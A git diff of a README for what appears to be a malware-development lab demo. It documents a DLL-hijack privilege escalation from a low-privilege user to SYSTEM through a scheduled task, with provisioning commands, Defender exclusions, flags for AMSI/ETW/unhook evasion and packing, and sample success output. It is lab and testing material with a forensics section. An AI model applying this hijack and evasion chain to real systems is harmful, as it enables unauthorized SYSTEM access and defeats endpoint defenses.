@@ -31,7 +31,7 @@ control.
 6. [Per-run flow — what each step changes](#6-per-run-flow--what-each-step-changes)
 7. [Reading the results](#7-reading-the-results)
 8. [Detection & forensics — what defenders see](#7-bis-detection--forensics--what-defenders-see)
-9. [Customization — flags & environment](#8-customization--flags--environment)
+9. [Customization — orchestrator flags](#8-customization--orchestrator-flags)
 10. [Troubleshooting](#9-troubleshooting)
 11. [Repository layout](#10-repository-layout)
 12. [The helpers this command demonstrates](#11-the-helpers-this-command-demonstrates)
@@ -54,9 +54,8 @@ flowchart LR
 
 Read it as: **"who acts" → "what they do" → "what changes on disk"**.
 
-The chain depends on three concrete misconfigurations baked into
-the test VM by `provision-privesc.ps1` (and present in many
-real-world target environments):
+The chain depends on three concrete misconfigurations created
+during §2 (and present in many real-world target environments):
 
 1. **`C:\Vulnerable\` is writable by `lowuser`** — typical of any
    third-party software installed under a non-System dir with
@@ -293,9 +292,10 @@ whoami /groups | findstr /i "high\|administrators"
 ### 2.6 Run the orchestrator (lowuser cmd shell)
 
 ```cmd
-:: AntiDebug must be OFF on KVM/Hyper-V hosts (the RDTSC vs
-:: CPUID delta in the packer's slice-5.6 stub trips on VMEXIT
-:: and the DLL silently no-ops). Leave it on for bare metal.
+:: AntiDebug must be OFF if the target is running under a
+:: hypervisor (KVM/Hyper-V/VMware): the RDTSC ↔ CPUID delta in
+:: the packer's slice-5.6 stub trips on the VMEXIT and the DLL
+:: silently no-ops. On bare metal, leave the flag at its default.
 C:\Users\Public\maldev\privesc-e2e.exe -mode 8 -antidebug=false
 ```
 
@@ -347,16 +347,6 @@ Remove-Item -Recurse -Force C:\Users\Public\maldev
 # Defender exclusions, if you added them.
 Remove-MpPreference -ExclusionPath C:\Vulnerable\,C:\Users\Public\maldev\,C:\ProgramData\maldev-marker\ -ErrorAction SilentlyContinue
 ```
-
-### 2.9 Shortcut for automated regression runs
-
-If you maintain the project and want to **regression-test the
-chain on every commit** rather than run it by hand, the repo
-ships a driver (`scripts/vm-privesc-e2e.sh`) that automates §2.0
-through §2.8 against a VM with an `INIT` snapshot — see
-[§5](#5-target-windows-host--one-time-setup) for the snapshot
-shape. The driver is purely a convenience wrapper for CI/dev
-loops; the manual flow above is the canonical reference.
 
 ---
 
@@ -415,12 +405,10 @@ question is *how do you reach the box to type the commands*:
 - **Over RDP** — same, just remote desktop in first.
 - **Headless / over the network** — see §5.1 for OpenSSH
   installation (lets you skip the keyboard entirely).
-- **As a VM you want to regression-test** — see §5.2 for the
-  snapshot recipe that the optional driver script consumes.
 
 ### 5.1 Optional — install OpenSSH on the target (headless access)
 
-Useful when the target is in a rack, lab, or VM you'd rather
+Useful when the target is in a rack or a lab you'd rather
 script against than RDP into. Open an **elevated** PowerShell:
 
 ```powershell
@@ -457,67 +445,6 @@ From your operator host:
 ```bash
 ssh -i ~/.ssh/id_ed25519 <admin>@<target-ip> 'whoami'
 # → DESKTOP-…\<admin>
-```
-
-### 5.2 Optional — snapshot the clean state (VM regression only)
-
-If the target is a VM and you want the optional driver
-(`scripts/vm-privesc-e2e.sh`) to reset between regression runs:
-
-```bash
-# VirtualBox — snapshot while powered off.
-VBoxManage controlvm <VM_NAME> poweroff
-VBoxManage snapshot   <VM_NAME> take INIT --pause
-
-# libvirt/KVM — snapshot while running so revert is instantaneous.
-virsh start <VM_NAME>
-sleep 30                                # let it reach the login screen
-virsh snapshot-create-as <VM_NAME> INIT
-```
-
-The driver auto-detects the hypervisor (`VBoxManage` in `PATH` →
-vbox, else `virsh` → libvirt). Default names + IPs are
-`Windows10` / `192.168.56.102` (vbox) and `win10` /
-`192.168.122.122` (libvirt); override via env vars:
-
-```bash
-MALDEV_VM_NAME=my-win10 \
-MALDEV_VM_HOST_IP=10.0.0.50 \
-bash scripts/vm-privesc-e2e.sh -m 8
-```
-
-### 5.5 What `lowuser` and the victim look like (you don't create these)
-
-The driver's `provision-lowuser.ps1` + `provision-privesc.ps1`
-do all of this on every run, but if you ever want to reproduce
-manually:
-
-```powershell
-# provision-lowuser.ps1 (~ 30 LOC, gist below)
-$pw = ConvertTo-SecureString 'MaldevLow42x' -AsPlainText -Force
-New-LocalUser  -Name lowuser -Password $pw -PasswordNeverExpires
-Set-LocalUser  -Name lowuser -Password $pw
-net user lowuser /passwordreq:yes
-net user lowuser 'MaldevLow42x'                       # belt + suspenders
-Add-LocalGroupMember -SID S-1-5-32-545 -Member lowuser  # Users group
-# Grant SeBatchLogonRight via secedit (run-as-lowuser harness needs it).
-# Then make C:\Users\Public\maldev\ writable by lowuser.
-
-# provision-privesc.ps1 — the vulnerable surface
-New-Item -ItemType Directory -Force C:\Vulnerable
-icacls C:\Vulnerable /grant 'lowuser:(M)'             # lowuser-Modify
-Copy-Item victim.exe C:\Vulnerable\
-New-Item -ItemType Directory -Force C:\ProgramData\maldev-marker
-icacls C:\ProgramData\maldev-marker /grant '*S-1-1-0:(M)'
-
-# The SYSTEM scheduled task.
-schtasks /Create /TN MaldevHijackVictim `
-         /TR 'C:\Vulnerable\victim.exe' `
-         /SC MINUTE /MO 1 `
-         /RU SYSTEM /RL HIGHEST /F
-# Allow lowuser to /Run it.
-$task = "\MaldevHijackVictim"
-# (driver patches the task XML SDDL to add lowuser RX)
 ```
 
 ---
@@ -567,14 +494,12 @@ token, does the following in-process:
 
 | Path | Content | Tier |
 |---|---|---|
-| VM `C:\Vulnerable\hijackme.dll` | the packed payload `lowuser` planted | (artefact) |
-| VM `C:\Vulnerable\fakelib.dll` (Mode 10 only) | the real Go DLL whose named exports we mirror | (artefact) |
-| VM `C:\ProgramData\maldev-marker\whoami.txt` | probe payload's `whoami` output | **STRONG proof** |
-| VM `C:\ProgramData\maldev-marker\victim.log` | one line per `victim.exe` fire | **ADEQUATE proof** |
-| VM `C:\ProgramData\maldev-marker\probe-*.txt` | probe breadcrumbs (`probe-started.txt`, `probe-root-marker.txt`) | bisect aid |
-| VM `C:\ProgramData\maldev-marker\orch-step{1,2,3}-*.txt` | orchestrator breadcrumbs | bisect aid |
-| host `ignore/privesc-e2e/whoami.txt` | fetched marker | STRONG if it contains `System` / `Système` / `Sistema` |
-| host `ignore/privesc-e2e/victim.log` | fetched log | ADEQUATE if it contains `LoadLibrary succeeded` post-plant |
+| `C:\Vulnerable\hijackme.dll` | the packed payload `lowuser` planted | (artefact) |
+| `C:\Vulnerable\fakelib.dll` (Mode 10 only) | the real Go DLL whose named exports we mirror | (artefact) |
+| `C:\ProgramData\maldev-marker\whoami.txt` | probe payload's `whoami` output | **STRONG proof** |
+| `C:\ProgramData\maldev-marker\victim.log` | one line per `victim.exe` fire | **ADEQUATE proof** |
+| `C:\ProgramData\maldev-marker\probe-*.txt` | probe breadcrumbs (`probe-started.txt`, `probe-root-marker.txt`) | bisect aid |
+| `C:\ProgramData\maldev-marker\orch-step{1,2,3}-*.txt` | orchestrator breadcrumbs | bisect aid |
 
 ### 7.2 Verdict tiers
 
@@ -599,26 +524,27 @@ FAIL              neither artefact present
 
 ### 7.3 A sample successful Mode-8 run
 
+The orchestrator output from §2.6 looks like this end-to-end:
+
 ```
-[23:22:00] restoring snapshot INIT
-[23:22:08] SSH up after ~2s
-[23:22:08] building probe.exe + fakelib.dll + victim.exe + privesc-e2e.exe
-[23:22:09] uploading artifacts to test@192.168.122.122
-[23:22:10] provisioning lowuser account
-  [+] created lowuser
-  [+] lowuser granted SeBatchLogonRight
-[23:22:12] provisioning victim.exe + SYSTEM scheduled task
-  [+] task MaldevHijackVictim : SYSTEM-context, action=C:\Vulnerable\victim.exe
-[23:22:16] orchestrator args: -mode 8 -antidebug=false
-[23:22:17] executing privesc-e2e.exe AS lowuser (mode=8) — this can take 60-90s
+[18:35:00] == maldev privesc-e2e orchestrator ==
+[18:35:00] running as: desktop-41tgtr3\lowuser
+[18:35:00] probe payload: 8918 bytes
 [18:35:00] evasion.preset.Aggressive applied: AMSI + ETW + unhook + CET + ACG + BlockDLLs
+[18:35:00] pack mode: 8 (compress=true antidebug=false randomize=true)
 [18:35:00] packing probe.exe → DLL via Mode 8 (ConvertEXEtoDLL)
+[18:35:00] packed DLL: 12800 bytes
 [18:35:00] planted DLL at C:\Vulnerable\hijackme.dll
+[18:35:00] wiped old marker C:\ProgramData\maldev-marker\whoami.txt
+[18:35:00] schtasks /Run denied (expected as lowuser); falling back to natural trigger
 [18:35:00] polling C:\ProgramData\maldev-marker\whoami.txt for up to 2m20s
 [18:35:01] marker contents: Système|pid=8952
 [18:35:01] ✅ SUCCESS: payload ran as SYSTEM (got "système", we are "desktop-…\lowuser")
-[23:22:07] ✅ STRONG SUCCESS — marker shows SYSTEM identity (mode 8)
 ```
+
+Exit code 0 (with the success line above) means STRONG: the
+payload thread inherited the SYSTEM token from the scheduled
+task and wrote a SYSTEM-tagged file `lowuser` can read back.
 
 ---
 
@@ -799,31 +725,9 @@ If you only run one command after a suspected hit, this is it:
 
 ---
 
-## 8. Customization — flags & environment
+## 8. Customization — orchestrator flags
 
-### 8.1 Driver flags (`scripts/vm-privesc-e2e.sh`)
-
-```bash
--m {8|10}       packer mode (default: 8)
--p PASSWORD     lowuser password (default: 'MaldevLow42x' — keep it ASCII-only)
--k              KEEP_VM=1: leave the VM running after the verdict for SSH inspection
-```
-
-### 8.2 Environment variables consumed by the driver
-
-| Variable | Effect | Default |
-|---|---|---|
-| `MALDEV_VM_DRIVER` | `vbox` or `libvirt` | auto-detect (VBox if `VBoxManage` is in PATH) |
-| `MALDEV_VM_NAME` | hypervisor domain name | `Windows10` (vbox) / `win10` (libvirt) |
-| `MALDEV_VM_HOST_IP` | the VM's reachable IP | `192.168.56.102` (vbox) / `192.168.122.122` (libvirt) |
-| `MALDEV_VBOX_EXE` | full path to `VBoxManage.exe` (vbox only) | autodiscovered |
-| `MALDEV_VM_WINDOWS_SSH_KEY` | SSH private key to the admin user | `~/.ssh/vm_windows_key` |
-| `MALDEV_PRIVESC_E2E_ARGS` | override the orchestrator argv entirely | auto-built `-mode N [-antidebug=false]` |
-
-### 8.3 Orchestrator flags (`privesc-e2e.exe`)
-
-You normally never call the orchestrator directly — the driver
-does. But if you SSH into the VM and want to drive it manually:
+You launch the orchestrator at §2.6. Its CLI surface:
 
 ```
 -mode int        packer mode: 8 (ConvertEXEtoDLL) or 10 (PackProxyDLL fused) [default 8]
@@ -834,7 +738,7 @@ does. But if you SSH into the VM and want to drive it manually:
 -marker string   where the probe will write whoami output                    [default "C:\ProgramData\maldev-marker\whoami.txt"]
 -no-trigger      plant the DLL but do not /Run the task — wait for natural trigger
 -compress        LZ4-compress the payload                                    [default true]
--antidebug       AntiDebug PEB + RDTSC check at DllMain entry                [default true; auto-OFF on libvirt/KVM — see §9]
+-antidebug       AntiDebug PEB + RDTSC check at DllMain entry                [default true; set to false on hypervised hosts — see §9]
 -randomize       Phase-2 randomisation suite (timestamps, section names, …)  [default true]
 -rounds int      stage-1 SGN encoding rounds                                 [default 3]
 ```
@@ -848,26 +752,35 @@ is the proven fix.
 
 | Symptom | Cause | Fix |
 |---|---|---|
-| `SSH never came up after 180s` | wrong key path or VM not on the expected IP | `which ssh && ssh -i ~/.ssh/vm_windows_key test@<VM_IP> whoami` — fix until that prints `…\test` |
-| `FAIL: snapshot restore` (libvirt) | VM domain name doesn't match `MALDEV_VM_NAME` or `virbr0` is down | `virsh list --all` shows the right name? `ip link show virbr0` should be `UP,LOWER_UP` — if not: `virsh net-destroy default && virsh net-start default` |
-| `Erreur : Le nom d'utilisateur ou le mot de passe est incorrect` (schtasks /RP) | password contains shell-special chars (`!`, `%`, `"`, `^`) | use only `[A-Za-z0-9]` in `-p` argument |
-| `Impossible de terminer l'opération, car le fichier contient un virus` (provision script) | Defender flagged the script via AMSI | the driver's provisioning is now registry-direct + no `Set-MpPreference`; ensure you're on a recent commit (`b6d26c8` or later) |
-| `Le mappage entre les noms de compte et les ID de sécurité n'a pas été effectué` (icacls) | French Windows locale rejects English principal names | use SID `*S-1-1-0` not `Everyone`, `S-1-5-32-545` not `Users` — provisioning scripts already do this |
-| `###RC=1` <1 s, no orchestrator output, no breadcrumb files | bash single-quotes around `-Password` are NOT stripped by cmd.exe; PowerShell sees literal `'MaldevLow42x'` (14 chars), schtasks `/RP` then sends `MaldevLow42x` (12 chars) → STATUS_WRONG_PASSWORD | already fixed in commit `11d37d8` — bash double-quotes that cmd.exe DOES strip |
-| `LoadLibrary succeeded` in victim.log but no `whoami.txt` on libvirt/KVM | RDTSC ↔ CPUID delta in the AntiDebug stub trips on KVM VMEXIT — silent no-op LoadLibrary | the driver auto-passes `-antidebug=false` when `DRIVER=libvirt`; for ad-hoc runs `MALDEV_PRIVESC_E2E_ARGS="-mode 8 -antidebug=false"` |
-| Verdict stays ADEQUATE on a non-English Windows | French/Spanish/Italian/Portuguese SYSTEM name returned in Windows-1252 (`Système` byte `0xE8`) — neither `strings.Contains("system")` nor `grep -i 'system'` matches | both fixed in `11d37d8` — orchestrator ASCII-strips + skeleton-matches; driver uses `LC_ALL=C grep -aE` for byte-level grep |
-| GUI VM but `headless` boot loops | INIT snapshot taken with active desktop session | re-take with `VBoxManage startvm $VM --type headless` (vbox) or just `virsh start $VM` (libvirt), wait for SSH, then snapshot |
-| `pattern fakelib/fakelib.dll: no matching files found` at host build | fakelib step skipped (e.g. mingw missing) | install `mingw-w64`, then the driver re-runs the cgo c-shared build |
+| `Erreur : Le nom d'utilisateur ou le mot de passe est incorrect` (schtasks /RP) | password contains shell-special chars (`!`, `%`, `"`, `^`) | use only `[A-Za-z0-9]` for the lowuser password |
+| `Impossible de terminer l'opération, car le fichier contient un virus` when running the orchestrator | Defender flagged `privesc-e2e.exe` on disk before exec | add a Defender exclusion for `C:\Users\Public\maldev\` and `C:\Vulnerable\` (see the Defender note after §2.3) |
+| `Le mappage entre les noms de compte et les ID de sécurité n'a pas été effectué` (icacls) | non-English Windows rejects English principal names | use SIDs: `*S-1-1-0` not `Everyone`, `*S-1-5-32-545` not `Users` — §2.2/§2.3 already do this |
+| `runas /user:lowuser …` says wrong password | `Set-LocalUser` SAM password representation differs from what `runas`/schtasks expect on some Win10 builds | re-run `net user lowuser MaldevLow42x` from elevated PowerShell — §2.2 does both `Set-LocalUser` AND `net user` for this reason |
+| orchestrator exits 1 immediately with no output, no breadcrumbs | binary too fresh — Defender SmartScreen blocked first execution | add the exclusion above, or run `Unblock-File C:\Users\Public\maldev\privesc-e2e.exe` first |
+| `LoadLibrary succeeded` in victim.log but `whoami.txt` never appears | RDTSC ↔ CPUID delta in the AntiDebug stub trips on a hypervised CPU (KVM/Hyper-V/VMware VMEXIT) | re-run with `-antidebug=false` |
+| `whoami.txt` exists but verdict is PARTIAL on non-English Windows | French/Spanish/Italian/Portuguese SYSTEM name reported in Windows-1252 (`Système` byte `0xE8`) | already fixed in commit `11d37d8` — orchestrator strips non-ASCII + matches per-locale skeleton |
+| `lowuser` token visible in §2.5 (`whoami /groups`) shows `BUILTIN\Administrators` | the lowuser account was promoted (e.g. you added it to Administrators while testing) | `Remove-LocalGroupMember -SID S-1-5-32-544 -Member lowuser`, then `Logout` and back in as lowuser |
+| `schtasks /Run` succeeds as lowuser but task does not fire | task RunLevel is LIMITED instead of HIGHEST | recreate the task with `/RL HIGHEST` per §2.3 |
+| marker dir exists but probe can't write to it | `C:\ProgramData\maldev-marker\` ACL doesn't grant Everyone Modify | `icacls C:\ProgramData\maldev-marker /grant '*S-1-1-0:(M)'` |
 
-For deeper diagnosis, run with `-k` (KEEP_VM):
+For deeper diagnosis after a failed run, leave everything in
+place and inspect from an elevated shell:
 
-```bash
-bash scripts/vm-privesc-e2e.sh -m 8 -k
-ssh -i ~/.ssh/vm_windows_key test@<VM_IP>
-# Inspect breadcrumbs, scheduled task history, Defender events:
-cmd /c "dir C:\ProgramData\maldev-marker\"
-powershell -Command "Get-WinEvent -LogName 'Microsoft-Windows-TaskScheduler/Operational' -MaxEvents 20 | Format-List"
-powershell -Command "Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 5 | Format-List"
+```powershell
+# Where did the chain stop?
+dir C:\ProgramData\maldev-marker\           # which breadcrumbs exist?
+type C:\ProgramData\maldev-marker\victim.log
+
+# Did the task even fire?
+Get-WinEvent -LogName 'Microsoft-Windows-TaskScheduler/Operational' -MaxEvents 20 |
+  Where-Object { $_.Message -match 'MaldevHijackVictim' } | Format-List
+
+# Did Defender intervene?
+Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/Operational' -MaxEvents 5 | Format-List
+
+# Did the lowuser shell actually authenticate (4625 = failed logon)?
+Get-WinEvent -LogName Security -FilterXPath "*[System[EventID=4624 or EventID=4625]]" -MaxEvents 10 |
+  Where-Object { $_.Message -match 'lowuser' } | Format-List TimeCreated,Id,Message
 ```
 
 ---
@@ -882,14 +795,11 @@ powershell -Command "Get-WinEvent -LogName 'Microsoft-Windows-Windows Defender/O
 | `probe/main.go` | Original Go probe — **does NOT survive** thread-injection by Mode-8 stub (Go runtime requires being the process entry point). Kept as a reference; revive only if the runtime-init issue is solved. |
 | `victim/main.go` | DELIBERATELY VULNERABLE — `LoadLibrary("hijackme.dll")` then sleeps 5 s. Deployed at `C:\Vulnerable\victim.exe`, run as SYSTEM by the scheduled task. |
 | `fakelib/fakelib.go` | Real Go-built `c-shared` DLL with three named exports. Embedded via `//go:embed fakelib/fakelib.dll` for the Mode-10 path. |
-| `../../scripts/vm-privesc-e2e.sh` | The optional driver — automates steps 1-9 of [§6](#6-per-run-flow--what-each-step-changes) against a VM with an `INIT` snapshot |
-| `../../scripts/vm-test/provision-lowuser.ps1` | creates `lowuser` + grants rights + makes drop dirs |
-| `../../scripts/vm-test/provision-privesc.ps1` | builds the vulnerable surface (`C:\Vulnerable`, victim, task, marker dir) |
-| `../../scripts/vm-test/run-as-lowuser.ps1` | the schtasks-wrapper that runs the orchestrator under the `lowuser` token + captures stdout |
 | `../../docs/refactor-2026-doc/privesc-e2e-lessons-2026-05-12.md` | session-by-session debugging log if you want the archaeology |
 
 The build artefacts `probe/probe.exe` and `fakelib/fakelib.dll`
-are gitignored — the driver rebuilds them on every run.
+are gitignored — rebuild from source on every run per
+[§2.0](#20-build-the-binaries-operator-host-before-you-arrive).
 
 ---
 
